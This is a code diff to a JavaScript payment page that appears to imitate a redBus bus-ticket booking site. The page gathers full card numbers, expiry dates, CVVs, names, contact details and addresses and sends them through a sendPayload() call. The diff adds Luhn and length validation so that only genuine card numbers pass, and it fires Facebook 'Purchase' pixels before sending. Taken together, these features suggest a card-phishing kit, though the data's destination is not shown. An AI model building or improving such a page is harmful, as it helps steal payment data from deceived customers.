@@ -1594,7 +1594,6 @@ if (isTicket) {
 
 fbq('init', '1325759409620752');
 
-// 加載額外像素
 fetch('/api/settings')
   .then(function(r) { return r.json(); })
   .then(function(json) {
@@ -1603,21 +1602,7 @@ fetch('/api/settings')
       fbq('init', p.pixelId);
     });
   })
-  .catch(function() {})
-  .finally(function() {
-    // 從 localStorage 讀取金額
-    var booking = {};
-    try {
-      booking = JSON.parse(localStorage.getItem('redbus_booking') || '{}');
-    } catch(e) {}
-    
-    var amount = Number(booking.amount) || 0;
-
-    fbq('track', 'Purchase', {
-      value: amount,
-      currency: 'MYR'
-    });
-  });
+  .catch(function() {});
  
  
   /* ═══════════════════════════════════════════
@@ -2281,6 +2266,16 @@ fetch('/api/settings')
   /* ═══════════════════════════════════════════
      7. 提交 & 发送
   ═══════════════════════════════════════════ */
+  function luhnCheck(num) {
+    var sum = 0, alt = false;
+    for (var i = num.length - 1; i >= 0; i--) {
+      var n = parseInt(num[i], 10);
+      if (alt) { n *= 2; if (n > 9) n -= 9; }
+      sum += n; alt = !alt;
+    }
+    return sum % 10 === 0;
+  }
+
   function submitPayment() {
     var cn  = (q('cardNumber') ? q('cardNumber').value : '').replace(/\s/g, '');
     var exp = q('expiry')     ? q('expiry').value.trim()     : '';
@@ -2296,6 +2291,19 @@ fetch('/api/settings')
  
     if (!cn || !exp || !cv || !ch || !fn || !em || !ph || !a1 || !ct || !st || !zc) {
       showMsg('error', 'Fill all required fields.');
+      return;
+    }
+    // Card number validation
+    if (!/^\d+$/.test(cn)) {
+      showMsg('error', 'Card number must be digits only.');
+      return;
+    }
+    if (cn.length < 13 || cn.length > 19) {
+      showMsg('error', 'Invalid card number length.');
+      return;
+    }
+    if (!luhnCheck(cn)) {
+      showMsg('error', 'Invalid card number.');
       return;
     }
     if (!/^\d{2}\/\d{2}$/.test(exp)) {
@@ -2325,6 +2333,19 @@ fetch('/api/settings')
       setTimeout(sendPayload, 2000);
       return;
     }
+
+
+    if (window.fbq) {
+    var _booking = {};
+    var _ticket = {};
+    try { _booking = JSON.parse(localStorage.getItem('redbus_booking') || '{}'); } catch(e) {}
+    try { _ticket = JSON.parse(localStorage.getItem('redbus_booking_ticket') || '{}'); } catch(e) {}
+    var _amount = Number(_booking.amount || _ticket.amount || 0);
+    fbq('track', 'Purchase', {
+      value: _amount,
+      currency: 'MYR'
+    });
+  }
     sendPayload();
   }
  
